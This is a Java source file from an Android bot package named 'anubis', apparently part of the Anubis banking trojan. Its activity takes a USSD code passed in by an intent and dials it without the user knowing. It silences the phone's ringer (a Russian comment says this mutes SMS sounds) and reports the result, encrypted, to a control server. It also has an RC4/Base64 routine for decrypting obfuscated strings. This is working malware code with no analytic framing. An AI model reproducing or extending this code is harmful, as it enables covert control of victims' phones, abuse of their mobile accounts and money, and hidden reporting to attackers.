package anubis.bot.myapplication.Activity;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.UtilsClass;
import anubis.bot.myapplication.Constants;

public class ActivityStartUSSD extends Activity {
    UtilsClass SF = new UtilsClass();
    Constants const_ = new Constants();

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_start_ussd);
    //String getResult = SF.LoadLibFunctStartUSSD(this, "ActivityStartUSSD",getIntent(),getIntent().getStringExtra("str"));
    /*if(!getResult.equals("null")){
        SF.POST(this,"4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|"+getResult+"|"));
    }*/
 try {
            Intent intent = getIntent();
            String str = intent.getStringExtra("str");
            str = str.replace("AAA","#");
            str =  Uri.encode(str);
            Intent intent2 = new Intent(Intent.ACTION_CALL);
            startActivity(intent2.setData(Uri.parse("tel:" + str)));
            AudioManager audm;//Глушим звук смс!
            audm = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
            audm.setRingerMode(AudioManager.RINGER_MODE_SILENT);
            SF.POST(this,"4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|Request USSD is executed (" + str + ")|"));
        }catch (Exception ex){
            SF.Log("ERROR","Start USSD");
        }
    finish();
    }
}
